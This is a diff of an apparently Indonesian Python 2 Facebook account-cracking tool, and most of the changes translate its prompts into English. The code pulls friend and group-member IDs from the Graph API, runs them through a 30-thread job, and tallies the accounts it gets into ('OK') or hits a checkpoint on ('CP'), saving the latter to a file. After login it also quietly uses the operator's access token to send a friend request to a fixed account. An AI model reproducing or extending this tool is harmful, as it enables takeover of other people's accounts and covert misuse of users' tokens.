@@ -63,7 +63,7 @@ logo = """\033[1;93m█████████
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;96m[●] \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;96m[●] \x1b[1;93mTrying to login... \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 
 
 back = 0
@@ -141,7 +141,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successfuly'
-				os.system('xdg-open https://youtube.com/channel/UCkoqlUeR59-foCsaMdQJOJw')
+				os.system('xdg-open https://www.facebook.com/gazardevelopers')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -261,9 +261,9 @@ def pilih_super():
 			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mFriend Name\033[1;91m :\033[1;97m "+op["name"]
 		except KeyError:
 			print"\033[1;96m[!] \x1b[1;91mFriends not found!"
-			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
+			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 			super()
-		jalan('\033[1;96m[✺] \033[1;93mTaken IDs \033[1;97m...')
+		jalan('\033[1;96m[✺] \033[1;93mScaning IDs \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -276,12 +276,12 @@ def pilih_super():
 		try:
 			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
 			asw=json.loads(r.text)
-			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
+			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mGroup Name \033[1;91m:\033[1;97m "+asw['name']
 		except KeyError:
 			print"\033[1;96m[!] \x1b[1;91mGroup not found"
-			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
+			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 			super()
-		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
+		jalan('\033[1;96m[✺] \033[1;93mTaking IDs \033[1;97m...')
 		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+toket)
 		s=json.loads(re.text)
 		for p in s['data']:
@@ -431,10 +431,10 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print 42*"\033[1;96m="
-	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
+	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Completed \033[1;97m....'
 	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
-	print("\033[1;96m[+] \033[1;92mCP File tersimpan \033[1;91m: \033[1;97mout/super_cp.txt")
-	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
+	print("\033[1;96m[+] \033[1;92mCP File Storage \033[1;91m: \033[1;97mout/super_cp.txt")
+	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 	super()
 
 
